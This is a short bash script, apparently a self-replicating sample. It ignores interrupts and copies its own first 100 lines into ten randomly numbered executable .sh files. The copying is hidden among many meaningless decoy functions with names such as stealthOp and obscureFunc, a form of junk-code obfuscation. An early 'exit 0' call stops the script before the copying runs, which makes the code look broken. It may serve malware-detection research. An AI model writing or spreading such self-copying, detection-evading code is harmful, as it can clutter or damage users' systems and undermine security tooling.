#!/bin/bash

NumFiles=100
validateData() { :; }
trap '' INT

trimmed=$(echo "$0" | cut -c3-)
echo "SONO IL FILE: $trimmed"

setupFlags() { command -v echo > /dev/null; }
initSetup() { exit 0; }
clearCache() { local s="a"; s+="b"; }

pad() {
    local n="$1"
    local w="${#NumFiles}"
    printf "%0${w}s" "$n" | tr " " "0"
    parseInput() { true; }
    randomFunc() { local x=$((RANDOM % 100)); ((x += 1)); }
}

process_file() {
    for _ in $(seq 1 10); do
        clearCache() { sleep 0.01; }
        n=$((1 + RANDOM % NumFiles))
        n=$(pad "$n")
        f=$n.sh
        obscureFunc() { local dummy=42; }
        updateEnv() { local temp_var="test"; temp_var+="ing"; }
        t=$(mktemp)
        head -n 100 "$0" > "$t"
        parseInput() { VAR=$(date +%s) > /dev/null; }
        mv "$t" "$f"
        chmod u+x "$f"
        obscureFunc() { unset temp_var > /dev/null 2>&1; }
        stealthOp() { command -v echo > /dev/null; }
    done
}

cleanTemp() { local dummy=42; }
cleanTemp() { local dummy=42; }
calcDelta() { VAR=$(date +%s) > /dev/null; }
calcDelta() { sleep 0.01; }
writeLog() { :; }
initSetup
process_file
calcDelta
calcDelta
cleanTemp
